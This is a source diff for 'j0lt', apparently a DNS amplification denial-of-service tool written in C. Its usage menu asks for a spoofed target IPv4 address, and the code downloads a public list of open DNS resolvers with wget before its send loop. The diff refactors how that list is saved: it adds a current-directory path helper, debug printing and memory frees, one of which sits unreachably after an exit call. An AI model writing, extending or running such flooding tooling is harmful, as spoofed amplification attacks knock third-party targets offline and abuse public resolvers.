@@ -58,6 +58,7 @@
 #include "result.h"
 #include "process_control.h"
 #include "opts.h"
+#include "my_types.h"
 
 typedef struct __attribute__((packed, aligned(1))) {
   uint32_t sourceaddr;
@@ -173,9 +174,8 @@ DEFINE_INSERT_FN(qword, uint64_t)
 
 char **environ;
 
-const char *g_path = "./j0lt-resolv.txt";
-
-const char *g_menu = {
+GLOBAL_STRING_TYPE GLOBAL_STRING_RESOLV_LIST_SAVE_NAME = "logs/j0lt-resolv.txt";
+GLOBAL_STRING_TYPE GLOBAL_STRING_MENU = {
     " =========================================================\n"
     " Usage: sudo ./j0lt -t -p -n [OPTION]...                  \n"
     " -t <target>                      : target IPv4 (spoof)   \n"
@@ -200,9 +200,40 @@ bool insert_ip_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *pheader,
 bool send_payload(const uint8_t *datagram, uint32_t daddr, uint16_t uh_dport,
                   size_t nwritten);
 
-Result_T do_wget_resolv_list() {
-  char *g_wget[] = {"/bin/wget", "-O", "/tmp/resolv.txt",
-                    "https://public-dns.info/nameservers.txt", NULL};
+static char *get_current_directory_with_filename(const char *const filename) {
+  if (filename == NULL) return NULL;
+
+  char *cwd = getcwd(NULL, 0);
+  if (cwd == NULL) {
+    perror("Failed to get current directory");
+    return NULL;
+  }
+
+  size_t path_length = strlen(cwd) + strlen(filename) +
+                       2;  // +2 for the slash and null terminator.
+  char *full_path = malloc(path_length * sizeof(char));
+  if (full_path == NULL) {
+    perror("Failed to allocate memory for full path");
+    free(cwd);
+    return NULL;
+  }
+
+  snprintf(full_path, path_length, "%s/%s", cwd, filename);
+
+  free(cwd);
+
+  return full_path;
+}
+
+static Result_T do_wget_resolv_list(char *resolv_list_save_path) {
+  if (resolv_list_save_path == NULL) return RESULT_FAIL_IO;
+  char *wget[] = {"/bin/wget", "-O", resolv_list_save_path,
+                  "https://public-dns.info/nameservers.txt", NULL};
+
+#ifdef DEBUG
+  printf("+ wget command: ");
+  for (int i = 0; wget[i] != NULL; i++) printf("%s ", wget[i]);
+#endif  // DEBUG
 
   posix_spawnattr_t attr = {0};
   posix_spawn_file_actions_t *file_actionsp = NULL;
@@ -210,7 +241,7 @@ Result_T do_wget_resolv_list() {
   int status = init_spawnattr(&attr);
   if (status != 0) return status;
 
-  status = spawn_process(g_wget[0], file_actionsp, &attr, environ);
+  status = spawn_process(wget[0], file_actionsp, &attr, wget, environ);
   if (status != 0) return status;
 
   status = destroy_spawnattr(&attr);
@@ -219,11 +250,25 @@ Result_T do_wget_resolv_list() {
   return status;
 }
 
+Result_T wget_resolvlist_and_save_path(const char *const pathname,
+                                       char **result_path) {
+  *result_path = get_current_directory_with_filename(pathname);
+  if (*result_path == NULL) return RESULT_FAIL_IO;
+
+  int status = do_wget_resolv_list(*result_path);
+  if (status != RESULT_SUCCESS) {
+    free(*result_path);
+    *result_path = NULL;
+  }
+
+  return status;
+}
+
 int main(int argc, char **argv) {
   int i, nread;
   size_t szpayload, szpewpew;
 
-  printf("%s", g_menu);
+  printf("%s", GLOBAL_STRING_MENU);
 
   JoltOptions opts;
 
@@ -231,14 +276,20 @@ int main(int argc, char **argv) {
 
   CHECK_SUCCESS(parse_opts(&opts, argc, (const char **)argv),
                 "* parse_opts error");
-  CHECK_SUCCESS(do_wget_resolv_list(), "* wget error");
+  char *savepath = NULL;
+  CHECK_SUCCESS(wget_resolvlist_and_save_path(
+                    GLOBAL_STRING_RESOLV_LIST_SAVE_NAME, &savepath),
+                "* wget error");
 
-  printf("+ resolv list saved to %s\n", g_path);
+  printf("+ resolv list saved to %s\n", savepath);
 
   void *resolvlist = NULL;
   size_t szresolvlist = 0;
-  if (read_file_into_mem(g_path, &resolvlist, &szresolvlist) == false)
+  if (read_file_into_mem(savepath, &resolvlist, &szresolvlist) == false) {
     err_exit("* file read error");
+    free(savepath);
+  }
+  free(savepath);
 
   char payload[NS_PACKETSZ], lineptr[MAX_LINE_SZ_J0LT];
   while (opts.nthreads >= 1) {
